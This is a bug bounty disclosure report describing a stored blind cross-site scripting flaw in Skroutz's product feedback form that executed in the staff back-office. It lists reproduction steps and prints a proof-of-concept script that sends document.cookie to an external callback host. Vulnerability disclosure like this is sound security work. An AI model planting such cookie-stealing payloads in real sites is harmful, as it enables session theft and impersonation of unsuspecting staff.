# Title: Blind Cross-Site Scripting (XSS) in SKU/Product/Shop Reviews/Feedback

- **Platform**: Bugcrowd
- **Program**: Skroutz Public Managed Bug Bounty
- **Severity**: P3
- **Date**: 2024-07-14
- **Researcher**: rawezh_1
- **Bounty**: N/A (points-based)

## Summary
A stored blind cross-site scripting vulnerability was identified in the Skroutz product feedback form. The stored JavaScript code was reflected back to the back-office application, giving attackers visibility into internal pages and users.

## Technical Details
The Skroutz platform allows users to submit feedback on products. The feedback form accepted user input that was stored and later rendered in the internal back-office system used by Skroutz staff. The input was not properly sanitized, allowing JavaScript code to be stored. When a staff member viewed the feedback in the back-office panel, the script executed.

The vulnerability was a classic blind XSS — the attacker doesn't see the execution directly but sets up a callback mechanism (such as a request to an external server) that confirms when the payload triggers.

## Steps to Reproduce
1. Navigate to any product page on Skroutz
2. Submit a review/feedback containing a blind XSS payload
3. Use a monitoring service like xss.report to capture callbacks
4. Wait for a staff member to view the feedback in the back-office
5. Receive callback confirming script execution

## Proof of Concept
The researcher used xss.report to verify payload triggering. The injected payload was a standard JavaScript payload designed to fire when the back-office application rendered the feedback content. The payload structure was:
```html
<script>fetch('https://xss.report/callback/'+document.cookie)</script>
```

## Impact
- Visibility of internal back-office pages
- Access to internal user session data
- Potential limited-scope code execution in the context of the back-office
- Theft of session tokens from staff members
- Ability to perform actions on behalf of staff members

## Remediation
Skroutz fixed the issue by implementing proper input sanitization and output encoding in the feedback handling system. All user-supplied input is now sanitized before storage, and stored data is properly encoded when rendered in the back-office interface.

## References
- https://bugcrowd.com/disclosures/0c30c8c4-59e6-4127-a6cb-a991e9cc9a2f/blind-cross-site-scripting-xss-in-sku-product-shop-reviews-feedback
